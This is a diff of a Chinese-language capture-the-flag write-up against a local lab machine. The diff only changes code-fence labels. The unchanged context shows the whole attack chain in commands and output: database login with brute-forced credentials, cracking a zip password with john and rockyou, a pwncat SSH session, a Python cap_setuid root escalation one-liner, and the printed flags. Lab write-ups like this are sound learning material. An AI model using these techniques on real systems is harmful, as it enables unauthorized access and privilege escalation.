@@ -101,7 +101,7 @@ trainerjeff
 
 使用爆破出来的凭据进行连接数据库，查看基本信息
 
-```shell
+```bash
 MySQL [(none)]> show databases;
 +--------------------+
 | Database           |
@@ -150,7 +150,7 @@ http://192.168.56.104/secretgym/serverSHARE/credentials.zip
 
 下载下来进行分析，发现带有密码保护，尝试破解
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -188,7 +188,7 @@ tweety1          (?)
 
 ## User - trainerjean
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs trainerjean@192.168.56.104
 [12:53:41] Welcome to pwncat 🐈!
@@ -201,7 +201,7 @@ trainerjean
 
 ### flag - user
 
-```shell
+```bash
 (remote) trainerjean@slowman:/home/trainerjean$ cat user.txt
 YOU9et7HEpA$SwordofS10wMan!!
 ```
@@ -219,7 +219,7 @@ YOU9et7HEpA$SwordofS10wMan!!
 
 发现 python 可以利用 cap_setuid 实现提权
 
-```shell
+```bash
 (remote) trainerjean@slowman:/home/trainerjean$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 [](remote)[] []root@slowman[]:[]/home/trainerjean[]$ whoami
 root
@@ -229,7 +229,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 [](remote)[] []root@slowman[]:[]/root[]$ cat root.txt
 Y0UGE23t7hE515roo7664pa5$WoRDOFSlowmaN!!
 ```
